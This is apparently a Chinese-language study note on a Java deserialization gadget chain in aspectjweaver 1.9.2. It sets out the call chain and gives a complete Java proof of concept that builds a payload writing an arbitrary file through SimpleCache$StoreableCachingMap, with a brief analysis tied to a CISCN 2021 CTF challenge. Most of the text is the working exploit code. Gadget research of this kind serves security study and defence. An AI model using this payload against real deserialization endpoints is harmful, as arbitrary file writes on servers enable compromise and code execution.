# aspectjweaver任意文件写入

## Gadget chain&Requires

```
Gadget chain:
    HashSet.readObject()
        HashMap.put()
            HashMap.hash()
                TiedMapEntry.hashCode()
                    TiedMapEntry.getValue()
                        LazyMap.get()
                            SimpleCache$StorableCachingMap.put()
                                SimpleCache$StorableCachingMap.writeToPath()
                                    FileOutputStream.write()
Requires:
aspectjweaver:1.9.2
commons-collections:3.2.2(非必须)
```

## poc

```java
package com.payload;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import sun.nio.cs.StandardCharsets;

import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationTargetException;
import java.util.HashSet;
import java.util.Map;

public class Aspectjweaver {
    public static Object getObject() throws InvocationTargetException, InstantiationException, IllegalAccessException, ClassNotFoundException {
        String filename = "pwned.txt";
        String content = "pwned by aspectjweaver";
        String filepath = "C:\\code\\javaser\\aspectjweaver\\";
        
        Class<?> clazz = Class.forName("org.aspectj.weaver.tools.cache.SimpleCache$StoreableCachingMap");
        Constructor constructor = clazz.getDeclaredConstructors()[0];
        constructor.setAccessible(true);
        Object simpleCache = constructor.newInstance(filepath, 12);
        Transformer ct = new ConstantTransformer(content.getBytes());

        Map lazyMap = LazyMap.decorate((Map)simpleCache, ct);
        TiedMapEntry tme = new TiedMapEntry(lazyMap, filename);
        HashSet map = new HashSet(1);
        map.add(tme);

        return map;
    }
}
```

## analysis

ciscn2021决赛ezj4va中涉及到，而那道题中只用了aspectj包里的完成了写入。

`SimpleCache$StorableCachingMap.put()`

![image-20220526175452201](C:\Users\Liyc\Desktop\java反序列化\aspectjweaver\aspectjweaver.assets\image-20220526175452201.png)

`org.aspectj.weaver.tools.cache.SimpleCache.StoreableCachingMap#writeToPath`

![image-20220526175530548](C:\Users\Liyc\Desktop\java反序列化\aspectjweaver\aspectjweaver.assets\image-20220526175530548.png)

有对可控对象调用put，且put的参数可控的情况，则可以写入任意文件。

![image-20220526175617454](C:\Users\Liyc\Desktop\java反序列化\aspectjweaver\aspectjweaver.assets\image-20220526175617454.png)
